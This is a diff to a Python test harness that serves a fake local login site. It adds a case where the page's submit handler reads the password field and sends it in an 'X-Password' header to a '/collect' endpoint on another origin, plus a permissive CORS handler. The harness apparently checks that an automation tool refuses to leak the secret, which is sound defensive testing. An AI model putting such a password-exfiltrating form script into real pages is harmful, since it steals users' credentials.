@@ -162,7 +162,8 @@ def make_site(good_secret: str, marker: str, get_received: list, requests_seen: 
         def do_GET(self):
             url = urlsplit(self.path)
             query = parse_qs(url.query)
-            requests_seen.append({"method": "GET", "host": self.headers.get("Host", ""), "secret": good_secret in self.path})
+            requests_seen.append({"method": "GET", "host": self.headers.get("Host", ""),
+                                  "secret": good_secret in self.path or good_secret in str(self.headers)})
             if url.path == "/login":
                 message = "Wrong password." if "error" in query else "Please sign in."
                 self._send(200, FORM.format(title="login", message=message, action="/session", extra="",
@@ -174,6 +175,12 @@ def make_site(good_secret: str, marker: str, get_received: list, requests_seen: 
             elif url.path == "/submit-action":
                 other = "http://localhost:" + str(self.server.server_port) + "/session"
                 self._send(200, handler_form("submit-action", form_extra='onsubmit="this.action=' + chr(39) + other + chr(39) + '"'))
+            elif url.path == "/header-leak":
+                other = "http://localhost:" + str(self.server.server_port) + "/collect"
+                self._send(200, handler_form("header-leak", form_extra=(
+                    'onsubmit="event.preventDefault(); fetch(' + chr(39) + other + chr(39) + ', {headers: {' + chr(39)
+                    + "X-Password" + chr(39) + ": this.querySelector(" + chr(39) + "input[type=password]" + chr(39)
+                    + ').value}}); this.style.display=' + chr(39) + "none" + chr(39) + '"')))
             elif url.path == "/stop-method":
                 self._send(200, handler_form("stop-method", form_extra='onsubmit="this.method=' + chr(39) + "get" + chr(39) + '; event.stopPropagation()"'))
             elif url.path == "/stop-action":
@@ -206,6 +213,12 @@ def make_site(good_secret: str, marker: str, get_received: list, requests_seen: 
                                 f"<p style='font:bold 56px monospace;letter-spacing:6px;margin:40px'>{good_secret}</p>")
             else:
                 self._send(404, "not found")
+
+        def do_OPTIONS(self):
+            self.send_response(204)
+            self.send_header("Access-Control-Allow-Origin", "*")
+            self.send_header("Access-Control-Allow-Headers", "*")
+            self.end_headers()
 
         def do_POST(self):
             fields = self._fields()
@@ -415,7 +428,8 @@ print("screenshot saved")
         allowed_host = f"127.0.0.1:{port}"
         for case, path in (("submit-handler-stops-the-event-and-changes-method", "/stop-method"),
                            ("submit-handler-stops-the-event-and-changes-action", "/stop-action"),
-                           ("login-answers-307-to-another-origin", "/redirect-login")):
+                           ("login-answers-307-to-another-origin", "/redirect-login"),
+                           ("page-script-sends-the-password-in-a-header", "/header-leak")):
             requests_seen.clear()
             login_case(case, f"{base}{path}", "leak-good", "refused")
             seen = harness_private("import json\nprint(page_info()['url'])\nprint(json.dumps(cdp('Page.getNavigationHistory')))", env)
